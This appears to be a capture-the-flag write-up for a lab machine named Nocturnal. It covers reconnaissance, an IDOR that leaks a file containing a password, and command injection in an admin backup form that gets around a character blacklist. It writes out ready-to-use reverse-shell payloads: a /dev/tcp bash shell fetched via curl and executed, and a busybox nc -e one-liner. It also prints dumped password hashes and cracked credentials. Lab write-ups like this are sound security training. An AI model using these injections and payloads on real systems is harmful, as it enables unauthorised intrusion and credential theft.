## 1. Recon & Enumeration
### NMAP 

We run Nmap scan (default script scan -sC & version enumeration -sV) on ip and save the output.

```
nmap -sCV -p22,80 <ip> -oA nocturnal
```

- Find port 22 & 80 open.
- Port 80 enumeration says we are redirected to `nocturnal.htb`, so add it to the hosts file:

```
echo "<ip> nocturnal.htb" | sudo tee -a /etc/hosts
```

Let's visit the website 
- We see an web app with authentication and file upload feature.
- At the bottom, we find email address of support. support@nocturnal.htb
- Trying default credentials doesn’t work: `admin`, `root`, `user`, `test`, `password`.
- Let’s proceed with registering new account with credentials `user1:user1`
- After login, we find file upload form which might be vulnerable, so let’s get into it.

#### BURP suite

- Before blindly looking for vulnerabilities, we will test uploading a file, reading it and try to understand how the web app is working on the uploaded files.
- Uploading a file1.txt file and we get an error `Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.`
- Uploading a file with allowed extension works, after upload we see the redirect to the file below, clicking on it download the file.
-  Analyzing burp http history, we see a good looking request saying IDOR in my head. `GET /view.php?username=user1&file=file1.pdf`
- It uses 2 parameters: `username` and `filename`.
- Send the request to Burp Repeater and play with parameters and variations, we can understand the website operates like.

```
If valid username only -> Invalid file extension  
If valid filename only -> User not found  
If invalid username & valid filename => User not found  
If valid username & invalid filename => List user's uploaded file #Very important
```

We see list of uploaded file if we supply valid username & invalid filename, so if we can find valid usernames we will be able to see user’s uploaded file. (Confirmed by making another account.)

Now the question is how can we enumerate valid usernames.
Simple enough 
"If valid username & invalid filename => List user's uploaded file" which confirms valid username

#### ffuf 

We will be using `ffuf` with our valid PHPSESSID cookie and excluding response that contains “User not found”.
```
ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&file=test1.pdf' -H file-path/names.txt -fr 'User not found'
```

- 3 users: `admin`, `amanda`, and `tobias`.
- `admin` and `tobias` -> no uploaded file.
- Testing for `amanda`, there is a file called `privacy.odt`, download it. (http://nocturnal.htb/view.php?username=amanda&file=privacy.odt).

An ODT file is an **[Open Document Text](https://www.google.com/search?q=Open+Document+Text&oq=how+to+open+an+odt++file+and+what+is+it+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRigATIHCAIQIRigAdIBCDY4NzFqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8&mstk=AUtExfCxCsMvHRJJ4idxwI7_ErZXKTgZZYm82rOzvtoHCngaIzyqIHBeRoLHlRwMyb9TR1rFmU6N4ECOqRcAmklv1372vURg7pCOlabLf55Rb2Gz9ApfcDTZj-v_C4VQShoIkCkRwXulBUBdxaLDBCg_7jQZ0bSoeRGExJ2-d6cPIhe5mMk&csui=3&ved=2ahUKEwj17KbhufmRAxUrXmwGHT9kCCkQgK4QegQIARAB)** file, a standard, free, open-source format for word processing documents, similar to a Word .docx, used by programs like [LibreOffice](https://www.google.com/search?q=LibreOffice&oq=how+to+open+an+odt++file+and+what+is+it+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRigATIHCAIQIRigAdIBCDY4NzFqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8&mstk=AUtExfCxCsMvHRJJ4idxwI7_ErZXKTgZZYm82rOzvtoHCngaIzyqIHBeRoLHlRwMyb9TR1rFmU6N4ECOqRcAmklv1372vURg7pCOlabLf55Rb2Gz9ApfcDTZj-v_C4VQShoIkCkRwXulBUBdxaLDBCg_7jQZ0bSoeRGExJ2-d6cPIhe5mMk&csui=3&ved=2ahUKEwj17KbhufmRAxUrXmwGHT9kCCkQgK4QegQIARAC) Writer and [Apache OpenOffice Writer](https://www.google.com/search?q=Apache+OpenOffice+Writer&oq=how+to+open+an+odt++file+and+what+is+it+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQIRigATIHCAIQIRigAdIBCDY4NzFqMGo3qAIAsAIA&sourceid=chrome&ie=UTF-8&mstk=AUtExfCxCsMvHRJJ4idxwI7_ErZXKTgZZYm82rOzvtoHCngaIzyqIHBeRoLHlRwMyb9TR1rFmU6N4ECOqRcAmklv1372vURg7pCOlabLf55Rb2Gz9ApfcDTZj-v_C4VQShoIkCkRwXulBUBdxaLDBCg_7jQZ0bSoeRGExJ2-d6cPIhe5mMk&csui=3&ved=2ahUKEwj17KbhufmRAxUrXmwGHT9kCCkQgK4QegQIARAD). You can open it by double-clicking (if you have compatible software) or using programs like Microsoft Word, Google Docs, Pages (macOS), or free viewers, though formatting might shift slightly in non-native apps.

- It contains password `arHkG7HAI68X8s1J`. We can test it upon the web app or ssh
- Not working for SSH, but it works for the web app.
- Login as `amanda`, we see a link to admin panel
- Now we have admin access on web.
- We can see admin.php, backups, dashboard.php, Index.php
- Additionally we see a form to create a backups.
- Enter a password and click “Create Backup”, it shows the results in the panel below the button.
- It looks like the output of the `zip` command and am immediately thinking command injection now. Clicking “Download Backup” saves a file named `backup_xxxx-xx-xx.zip` to my system.
- Unzip it using the password we gave when creating the backup.
- As we are granted with access to admin page source code, we can see how `zip` command is being executed.
```<?php
if (isset($_POST['backup']) && !empty($_POST['password'])) {
$password cleanEntry($_POST['password']);
$backupFile "backups/backup_" date('Y-m-d'). ".zip";
```

Basically it is building a string from the POST request and running it with `proc_open`. The data submitted by user gets through the `cleanEntry` function first.

```
$blacklist_chars[';', '&', 'l', '$', ' '{', '}', '86'];
```

These are functions that automatically block certain characters including their `URL-encoded` version. One thing missed in the `cleanEntry` function is the `\n` character. 
After playing around for some time, figured that using newline (`%0a`) and tab (`%09`) as replacement works.

```
password=test%0Abash%09-c%09"id"
```

After `trial and errors` i found two working rev shell method

### Method 1

Making a payload `locally -> host -> download -> execute `
Which outsource the restrictions 
- Step 1 - create a `local payload` file 

```
echo 'bash -i >& /dev/tcp/ip/4444 0>&1' > shell
```
- Step 2 - Run `python server` in same dir 

```
python3 -m http.server 8888
```

- Step 3 - `Run listener` on the same port as payload 

```
nc -lnvp 4444
```

- Step 4 - `Download` in /tmp directory 

```
password=test%0acurl%09http://ip:8888/shell%09-o%09/tmp/shell&backup=
```

You can confirm if file has been downloaded by `ls%09/tmp`

- Step 5 - `Execute`
```
password=test%0abash%09/tmp/shell&backup=
```
 
### Method 2

`URL Encoded busybox` reverse shell

```
password=test%0Abusybox%09nc%09<ip>%09<port>%09-e%09%2Fbin%2Fbash</dev/null%09&backup=
```

## Getting shell

Both ways lead to the shell so back to listener, we have access as `www-data`.
- Upgrade Basic Shell Into Interactive TTY
- In home directory and notice the user tobias (ffuf scan also showed this)
- Might be we can get his credentials here.
- After a basic lookup into the shell we see `nocturnal_database` containing a database file.
 ```
$ sqlite3 nocturnal_database.db  
SQLite version 3.46.1 202x-xx-xx xx:xx:xx  
Enter ".help" for usage hints.  
sqlite> .tables  
uploads users  
sqlite> select * from users  
...> ;  
1|admin|d725aeba143f575736b07e045d8ceebb  
2|amanda|df8b20aa0c935023f99ea58358fb63c4  
4|tobias|55c82b1ccd55ab219b3b109b07d5061d  
         ------SNIP------- 
8|cn0x|62dd5084a03c9358eb1822d33ee94dd3
 ```

Let's try cracking `admin` and `tobias` hash real quick
- Use `crackstation` online database before `hashcat`.
- We successfully get the password for `tobias` - `slowmotionapocalypse`

### SSH - Tobias 

```
ssh tobias@nocturnal.htb
```

- Get user.txt 
